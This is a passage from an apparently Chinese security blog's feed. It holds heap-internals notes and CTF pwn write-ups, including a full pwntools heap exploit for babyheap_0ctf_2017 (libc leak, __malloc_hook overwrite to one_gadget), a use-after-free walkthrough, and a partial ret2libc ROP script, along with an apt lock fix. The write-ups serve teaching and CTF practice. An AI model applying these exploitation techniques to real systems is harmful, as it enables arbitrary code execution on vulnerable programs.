pwn(&quot;node3.buuoj.cn&quot;,25459,1 )</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux常见问题解决方法</title>
    <link href="/2020/02/03/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2020/02/03/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)<br>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</p><pre><code class="shell">ps -A | grep aptsudo kill -9 processnumbersudo rm /var/lib/dpkg/locksudo rm /var/lib/dpkg/lock-frontend</code></pre><p>E: Could not get lock /var/cache/apt/archives/lock - open (11: Resource temporarily unavailable) </p><p>E: Unable to lock directory /var/cache/apt/archives/</p><pre><code class="bash">sudo killall apt-getsudo rm /var/lib/apt/lists/locksudo rm /var/cache/apt/archives/locksudo rm /var/lib/dpkg/lock</code></pre>]]></content>
    
    
    <categories>
      
      <category>Linux使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux 问题解决</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN 环境搭建清单</title>
    <link href="/2020/02/03/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/"/>
    <url>/2020/02/03/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN-环境搭建清单"><a href="#PWN-环境搭建清单" class="headerlink" title="PWN 环境搭建清单"></a>PWN 环境搭建清单</h1><h2 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h2><p>ubuntu18、16</p><p>pwntools </p><p>edb 调试栈好</p><p>vim</p><p>libcsearcher</p><p>pwndbg 调试堆好</p><p>seccomp-tools 查看seccomp</p><p>proxychains4 apt get的快</p><h2 id="WIN-MAC"><a href="#WIN-MAC" class="headerlink" title="WIN/MAC"></a>WIN/MAC</h2><p>IDA 反汇编</p><p>die 查看32/64 和壳等</p><p><a href="http://mrbelieve.tech/2019/12/23/Pwn常用指令/" target="_blank" rel="noopener">一些常用指令</a></p><p><a href="[https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/#0x05-get-started-3dsctf-2016](https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn刷题之旅-(1)/#0x05-get-started-3dsctf-2016">可供参考exp from 南梦</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN环境搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆的基础知识</title>
    <link href="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="堆的基础知识"><a href="#堆的基础知识" class="headerlink" title="堆的基础知识"></a>堆的基础知识</h1><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><ul><li>修改某个函数的got表 为 system 的地址,然后参数准备为binsh 就可以</li><li>修改free函数为puts函数,然后某个堆里参数准备为某个函数的got表地址 就可以泄露地址了</li><li>one_gadget</li></ul><p>来源：<a href="https://www.anquanke.com/post/id/163971" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163971</a></p><p><strong>在 64 位程序中：</strong></p><pre><code>malloc(8)</code></pre><p>申请到的堆块总大小为 16 + 8 + 8 + 1 = 0x21</p><p>1.第一个 16 字节是<strong>系统最小分配的内存</strong>，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。</p><ul><li>在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节</li><li>例如，如果代码中是 malloc(0) 的话，<strong>堆管理器也会分配最小内存空间给你</strong></li></ul><p>2.第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）<br>3.第三个 8 字节为 size 字段的大小（32 位的为 4 字节）<br>4.最后一个 1 字节是 <strong>PREV_INUSE 的值，只有 0 或 1两个值</strong></p><hr><p>1.pre size 字段。<strong>只有在前面一个堆块是空闲的时候才有指</strong>，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0<br>2.size 字段。是用来指示当前堆块的大小的（头部加上 user data 的大小）。但是这个字段的最后三位相当于三个 flag ，有另外的作用。</p><p>这三位的作用分别是：</p><pre><code>1.NON_MAIN_ARENA     这个堆块是否位于主线程2.IS_MAPPED          记录当前 chunk 是否是由 mmap 分配的3.PREV_INUSE         记录前一个 chunk 块是否被分配</code></pre><p>这里重点讲解最后一位：<strong>用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1</strong>，所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节。</p><ul><li>所以前一个堆块的释放与否都和这两个字段（pre_size、size）的值有关，这是因为便于内存的释放操作（free）</li><li>user data 顾名思义就是用来存放用户数据的。</li></ul><h2 id="main-arena"><a href="#main-arena" class="headerlink" title="main arena"></a>main arena</h2><p>就算只申请10字节，内核也会分配132KB堆空间给ptmalloc2，用完内核再分配132KB。因为是主线程分配的，所以这个区域叫做 main arena。</p><p>==x/2gx &amp;main_arena==</p><p><strong>32位的程序使用 x/32xw  addr比较直观一点</strong></p><p><strong>64位的程序使用 x/64xw  addr</strong></p><h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>堆中第一个堆块,程序以后分配到的内存到要放在他的后面，就如下图的0x5578cbd73110（并且，堆向上生长</p><img src="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131214332010.png" srcset="/img/loading.gif" class="" title="image-20200131214332010"><blockquote><p>FD 指向链表中前一个堆块的指针，该指针指向的是chunk的head</p><p>BK 指向链表中后一个堆块的指针，该指针也是指向chunk的head，通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</p><p>FD_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p><p>BK_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</p><p>作者：合天智汇<br>链接：<a href="https://www.jianshu.com/p/5263bdbe92e2" target="_blank" rel="noopener">https://www.jianshu.com/p/5263bdbe92e2</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><p>这里我把第二个和第三个都free了</p><h2 id="free-函数和-bins"><a href="#free-函数和-bins" class="headerlink" title="free 函数和 bins"></a>free 函数和 bins</h2><p>堆管理器会根据用户已经申请到的内存空间大小进行释放，<strong>来决定放入哪类 bins 当作去</strong>.</p><p>主要的 bins 分为以下几类，重点讲解 fast bin，因为 fast bin 是使用到的最多的一类，也是其中结构最为简单的。</p><p>调用 free 函数以后程序做了两件事：<br><strong>1.清空此堆块的 user data<br>2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</strong></p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>顾名思义，就是为了快速重新分配回内存而存在的一个结构。</p><blockquote><p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p></blockquote><p><strong>fast bin 的特性</strong></p><p><strong>1.使用单链表来维护释放的堆块</strong><br>也就是和上图一样，从main_arena 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。</p><p>如下图所示，此时就是一个单链表结构</p><img src="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131214423497.png" srcset="/img/loading.gif" class="" title="image-20200131214423497"><p><strong>2.采用后进先出的方式维护链表（类似于栈的结构）</strong><br>当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，<strong>会选择后面新加入的堆块拿来先进行内存分配</strong></p><p>如上图，如果程序重新请求和上面的堆块大小一样时候（malloc），堆管理器就会直接使用 fast bin 里的堆块。</p><p><strong>这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块</strong>，此时 main_arena 就指向了这里。</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>顾名思义，这个是一个 small chunk ，满足的内存空间比 fast bin 大一点。</p><p>如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p></blockquote><ul><li><p>unsorted bin 与 fast bin 不同，他使用<strong>双向链表</strong>对 chunk 进行连接</p></li><li><p>unsorted 的字面意思就是”不可回收”的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个”垃圾桶”中。</p></li></ul><img src="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131215053221.png" srcset="/img/loading.gif" class="" title="image-20200131215053221">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>babyheap_0ctf_2017</title>
    <link href="/2020/02/02/babyheap_0ctf_2017/"/>
    <url>/2020/02/02/babyheap_0ctf_2017/</url>
    
    <content type="html"><![CDATA[<h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>参考wp:<a href="https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2</a></p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129165539077.png" srcset="/img/loading.gif" class="" title="image-20200129165539077"><pre><code>===== Baby Heap in 2017 =====1. AllocateCommand: 1Size: 300 Allocate Index 02. FillCommand: 2   Index: 0Size: 400Content: 3. FreeCommand: 3Index: 34. DumpCommand: 4Index: 05. Exit</code></pre><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172302922.png" srcset="/img/loading.gif" class="" title="image-20200129172302922"><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172208306.png" srcset="/img/loading.gif" class="" title="image-20200129172208306"><pre><code class="c">struct heap{    int ifExit;    int size;    char *str;}</code></pre><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172221992.png" srcset="/img/loading.gif" class="" title="image-20200129172221992"><p>这里可以看见没有检查v4跟结构体里的size大小，并且是按照v4来输入的，这样就可以覆盖到下一块</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172235026.png" srcset="/img/loading.gif" class="" title="image-20200129172235026"><p>都设置为了0，这样就不能<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/" target="_blank" rel="noopener">Use_after_free</a></p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172250382.png" srcset="/img/loading.gif" class="" title="image-20200129172250382"><p>先写好必须的四个功能</p><pre><code class="python">    def allocate(size):        sh.sendlineafter(&quot;Command:&quot;,&quot;1&quot;)        sh.sendlineafter(&quot;Size:&quot;,str(size))        sleep(0.1)    def fill(Index,payload):        sh.sendlineafter(&quot;Command:&quot;,&quot;2&quot;)        sh.sendlineafter(&quot;Index:&quot;,str(Index))        sh.sendlineafter(&quot;Size:&quot;,str(len(payload)))        sh.sendlineafter(&quot;Content:&quot;,str(payload))        sleep(0.1)    def free(Index):        sh.sendlineafter(&quot;Command:&quot;,&quot;3&quot;)        sh.sendlineafter(&quot;Index:&quot;,str(Index))        sleep(0.1)    def dump(Index):        sh.sendlineafter(&quot;Command:&quot;,&quot;3&quot;)        sh.sendlineafter(&quot;Index:&quot;,str(Index))        sleep(0.1)</code></pre><p>然后，先</p><pre><code class="python">add(0x10)     #0 0x00add(0x10)    #1 0x20add(0x10)    #2 0x40add(0x80)    #3 0x60gdb.attach(sh)heap</code></pre><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202114445460.png" srcset="/img/loading.gif" class="" title="image-20200202114445460"><pre><code class="python">free(2)    #0x40free(1)    #0x20</code></pre><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202114934969.png" srcset="/img/loading.gif" class="" title="image-20200202114934969"><p>然后，我们通过</p><pre><code class="python">payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+p8(0x60)    fill(0,payload)    #0x00</code></pre><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202115823555.png" srcset="/img/loading.gif" class="" title="image-20200202115823555"><p>在这里我们可以看见，由于没有限制输入长度，我们可以写入fd 8个a，bk 8个a， fd_nextsize p64(0)，bk_nextsize p64(0x21)，然后写入到下一块 我们本来已经free掉了的<code>0x20</code>中的 fd中，使他的指向 <code>0x60</code>的bin，这样我们看fastbins时就只能看见<code>0x20</code>和<code>0x60</code>了</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202121553155.png" srcset="/img/loading.gif" class="" title="image-20200202121553155"><pre><code class="python">allocate(0x10)    #1 0x20</code></pre>{% asset_img image-20200202122603540.png image-20200202122603540 %}<p>这样之后，我们的目的就达成了，把一块没有free的空间放入了fastbins中</p>{% asset_img image-20200202122724203.png image-20200202122724203 %}<pre><code class="python">payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x21)fill(1,payload) </code></pre><p>紧接着，我们把<code>0x40</code>的bk_nextsize 设为0x21,这样可以修改<code>0x60</code>的bin size为0x21(0x10 + 0x11)，绕过fastbin在分配内存的时候的检测</p><blockquote><p>BK_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</p></blockquote><p>再次<code>allocate(0x10)  #2 0x60</code>就会把之前的0x80的块分配出来</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202124220989.png" srcset="/img/loading.gif" class="" title="image-20200202124220989"><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202123933115.png" srcset="/img/loading.gif" class="" title="image-20200202123933115"><p>然后</p><pre><code class="python">payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x91)fill(1,payload)  #1 0x20 还原#3的bin的size</code></pre><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202124141267.png" srcset="/img/loading.gif" class="" title="image-20200202124141267"><pre><code class="python">allocate(0x80)    #4        #为了让#3的bin不再挨着top chunk</code></pre>{% asset_img image-20200202132442146.png image-20200202132442146 %}<p>然后我们将<code>0x60    #3</code>free掉之后</p>{% asset_img image-20200202132625185.png image-20200202132625185 %}{% asset_img image-20200202181236041.png image-20200202181236041 %}<p>这样fd 和bk 都指向main_arena+88处</p><p>==然后为啥dump2呢-。-==</p><pre><code class="python">io.recvuntil(&#39;Content: \n&#39;)main_arena = u64(io.recv(6).ljust(8,&#39;\x00&#39;))-88log.success(&#39;main arena: &#39;+hex(main_arena))libc_base = main_arena - 0x3c4b20 log.success(&#39;libc base: &#39;+hex(libc_base))</code></pre><p>0x3c4b20 可以在对应的libc中，搜索malloc_trim函数，可以在下图的地方看见</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202182025461.png" srcset="/img/loading.gif" class="" title="image-20200202182025461"><p>也可以使用<a href="https://github.com/bash-c/main_arena_offset" target="_blank" rel="noopener">main_arena_offset</a> <code>main_arena libcaddr</code>获取</p><p>Arbitrary Alloc的例行公事，最终修改malloc_hook的内容为one_gadget</p><pre><code class="python">one_gadget = libc_base + 0x4526a allocate(0x60)    #3        free(3)                    fake_chunk_addr = main_arena - 0x33        payload = p64(fake_chunk_addr)fill(2,payload)</code></pre><p>0x33</p><blockquote><p><code>p &amp;main_arena</code></p><p><code>$1 = (struct malloc_state *) 0x7f5081821b20 &lt;main_arena&gt;</code></p><p><code>x/10gx main_arena_addr-0x10</code></p><p><code>0x7f5081821b10 &lt;__malloc_hook&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b20 &lt;main_arena&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b30 &lt;main_arena+16&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b40 &lt;main_arena+32&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b50 &lt;main_arena+48&gt;:    0x0000000000000000    0x0000000000000000</code></p><p><code>find_fake_fast __malloc_hook_addr 0x70</code></p><p><code>FAKE CHUNKS0x7f5081821aed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA { prev_size = 5801060741742067712,  size = 127,  fd = 0x50814e2e20000000,  bk = 0x50814e2a0000007f,  fd_nextsize = 0x7f,  bk_nextsize = 0x0}</code></p><p>计算偏移</p><p><code>p/x main_arena_addr - fake_chunks_addr</code></p></blockquote><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202193142303.png" srcset="/img/loading.gif" class="" title="image-20200202193142303"><pre><code class="python">allocate(0x60)    #3allocate(0x60)    #5payload = &#39;a&#39;*0x13+p64(one_gadget)fill(5,payload)allocate(0x10)sh.interactive()</code></pre><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><pre><code class="python">from pwn import *context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)context.log_level = &#39;debug&#39;sh = process(&#39;./babyheap_0ctf_2017&#39;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)def allocate(size):    sh.recvuntil(&#39;Command: &#39;)    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Size: &#39;)    sh.sendline(str(size))def fill(idx,content):    sh.recvuntil(&#39;Command: &#39;)    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Index: &#39;)    sh.sendline(str(idx))    sh.recvuntil(&#39;Size: &#39;)    sh.sendline(str(len(content)))    sh.recvuntil(&#39;Content: &#39;)    sh.sendline(content)def free(idx):    sh.recvuntil(&#39;Command: &#39;)    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Index: &#39;)    sh.sendline(str(idx))def dump(idx):    sh.recvuntil(&#39;Command: &#39;)    sh.sendline(&#39;4&#39;)    sh.recvuntil(&#39;Index: &#39;)    sh.sendline(str(idx))allocate(0x10)    #0    0x00allocate(0x10)    #1    0x20allocate(0x10)    #2    0x40allocate(0x80)    #3    0x60free(2)free(1)payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+p8(0x60)    fill(0,payload)allocate(0x10)    #1payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x21)fill(1,payload)            allocate(0x10)    #2        payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x91)fill(1,payload)        allocate(0x80)    #4        free(3)                    dump(2)sh.recvuntil(&#39;Content: \n&#39;)main_arena = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88log.success(&#39;main arena: &#39;+hex(main_arena))libc_base = main_arena - 0x3c4b20log.success(&#39;libc base: &#39;+hex(libc_base))one_gadget = libc_base + 0x4526a # 0x4526a 0xf02a4 0xf1147 0x45216allocate(0x60)    #3        free(3)                    fake_chunk_addr = main_arena - 0x33        payload = p64(fake_chunk_addr)fill(2,payload)allocate(0x60)    #3allocate(0x60)    #5payload = &#39;a&#39;*0x13+p64(one_gadget)fill(5,payload)allocate(0x10)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆之UAF(Use_after_free)及调试-hitcontraining_uaf</title>
    <link href="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/"/>
    <url>/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/</url>
    
    <content type="html"><![CDATA[<h1 id="堆之UAF-Use-after-free-及调试-hitcontraining-uaf"><a href="#堆之UAF-Use-after-free-及调试-hitcontraining-uaf" class="headerlink" title="堆之UAF(Use_after_free)及调试-hitcontraining_uaf"></a>堆之UAF(Use_after_free)及调试-hitcontraining_uaf</h1><blockquote><p><a href="https://wiki.x10sec.org/pwn/heap/use_after_free/" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/use_after_free/</a></p><p><strong>一个很直接的想法是修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数。</strong> 那么该怎么执行呢？</p><p>我们可以简单来看一下每一个note生成的具体流程</p><ol><li><p>程序申请8字节内存用来存放note中的put以及content指针。</p></li><li><p>程序根据输入的size来申请指定大小的内存，然后用来存储content。</p></li></ol><pre><code>      +-----------------+                             |   put           |                             +-----------------+                             |   content       |       size                    +-----------------+-------------------&gt;+----------------+                                             |     real       |                                             |    content     |                                             |                |                                             +----------------+</code></pre><p>那么，根据我们之前在堆的实现中所学到的，显然note是一个fastbin chunk（大小为16字节）。我们的目的是希望一个note的put字段为magic的函数地址，那么我们必须想办法让某个note的put指针被覆盖为magic地址。由于程序中只有唯一的地方对put进行赋值。所以我们必须利用写real content的时候来进行覆盖。具体采用的思路如下</p><ul><li>申请note0，real content size为16（大小与note大小所在的bin不一样即可）</li><li>申请note1，real content size为16（大小与note大小所在的bin不一样即可）</li><li>释放note0</li><li>释放note1</li><li>此时，大小为16的fast bin chunk中链表为note1-&gt;note0</li><li>申请note2，并且设置real content的大小为8，那么根据堆的分配规则</li><li>note2其实会分配note1对应的内存块。</li><li>real content 对应的chunk其实是note0。</li><li>如果我们这时候向note3的chunk部分写入magic的地址，那么由于我们没有note1为NULL。当我们再次尝试输出note1的时候，程序就会调用magic函数。</li></ul></blockquote><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201220702851.png" srcset="/img/loading.gif" class="" title="image-20200201220702851"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221032403.png" srcset="/img/loading.gif" class="" title="image-20200201221032403"><p>free了但没有设置为0，所以存在uaf</p><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221102009.png" srcset="/img/loading.gif" class="" title="image-20200201221102009"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221149782.png" srcset="/img/loading.gif" class="" title="image-20200201221149782"><p>先申请两个0x10的空间，内容为aaaa</p><pre><code class="python">add(0x10,&quot;aaaa&quot;)add(0x10,&quot;aaaa&quot;)</code></pre><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201220613982.png" srcset="/img/loading.gif" class="" title="image-20200201220613982"><p>最下面的是top chunk，我们申请了的两块0x10空间，还有两块是因为下图，并且，堆块地址向上生长</p><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221459981.png" srcset="/img/loading.gif" class="" title="image-20200201221459981"><p>所以，最先的<code>0x826300</code>和<code>0x826328</code>应该就是最先分配的notelist[i]，里面存放着指向print_note_content的地址，<code>0x826310</code>和<code>0x826338</code>就是我们自己申请的堆了</p><p>然后在我们delete了这两个堆块之后，（由于重新运行程序所以地址改变</p><pre><code class="python">delete(0)delete(1)</code></pre><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201224306213.png" srcset="/img/loading.gif" class="" title="image-20200201224306213"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201224344952.png" srcset="/img/loading.gif" class="" title="image-20200201224344952"><p><code>0x902e010</code>（我们申请的）和<code>0x902e00</code>（存放puts地址的）先进入fastbins单链表</p><p>然后此时我们再<code>add(8,p32(shell))</code></p><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201225157906.png" srcset="/img/loading.gif" class="" title="image-20200201225157906"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201225221156.png" srcset="/img/loading.gif" class="" title="image-20200201225221156"><p><code>0x87d0028</code>先出来，储存print地址，然后再<code>0x87d0000</code>,储存magic地址</p><p>最后，我们再print heap0时，就跳转到了magic地址上面去了</p><hr><h2 id="有待深究。。。。"><a href="#有待深究。。。。" class="headerlink" title="有待深究。。。。"></a>有待深究。。。。</h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BrainOverFlow_Vol.1_BUU特供</title>
    <link href="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/"/>
    <url>/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="BrainOverFlow-Vol-1-BUU特供"><a href="#BrainOverFlow-Vol-1-BUU特供" class="headerlink" title="BrainOverFlow_Vol.1_BUU特供"></a>BrainOverFlow_Vol.1_BUU特供</h1><p>很有意思（好玩）的游戏，感谢札哥的题</p><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195435399.png" srcset="/img/loading.gif" class="" title="image-20200130195435399"><p>btw，我也没想到我会是第六个解出来的hhhhh，我可以吹一个月（笑</p><p>剧情我就不说了，反正很有意思的</p><p>具体东西都藏在/www/data里边，每一次的地图数据（主要在Map013，15，22）都有，个人等级，姓名，武器售卖价值等都可以改hhhhh</p><p>亏我三小时打通游戏，做了半天pwn以为是盲打，然后发现了文件就在图片旁边orz</p><h2 id="protect"><a href="#protect" class="headerlink" title="protect"></a>protect</h2><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130200100596.png" srcset="/img/loading.gif" class="" title="image-20200130200100596"><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195934944.png" srcset="/img/loading.gif" class="" title="image-20200130195934944"><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195944896.png" srcset="/img/loading.gif" class="" title="image-20200130195944896"><p>这图就是溢出点，buf空间只有0x40，但是却读入0xC8个，题目没有system和/bin/sh字段，就是ret2libc</p><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./protect&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./protect&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#39;)    sh.recvuntil(&quot;options&quot;)    sh.sendline(&quot;1&quot;)    sh.recvuntil(&quot;Password.&quot;)    pop_rdi = 0x0000000000400a43 # 通过ROPgadget获得    payload = cyclic(0x40 + 8)    payload += p64(pop_rdi)    payload += p64(elf.got[&#39;__libc_start_main&#39;])    payload += p64(elf.plt[&#39;puts&#39;])    payload += p64(0x40094B)    #pause()    sh.sendline(payload)    __libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))     libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    log.success(&quot;libc: &quot; + hex(libc))    log.success(&quot;system: &quot; + hex(system))    log.success(&quot;binsh: &quot; + hex(binsh))    sh.recvuntil(&quot;options&quot;)    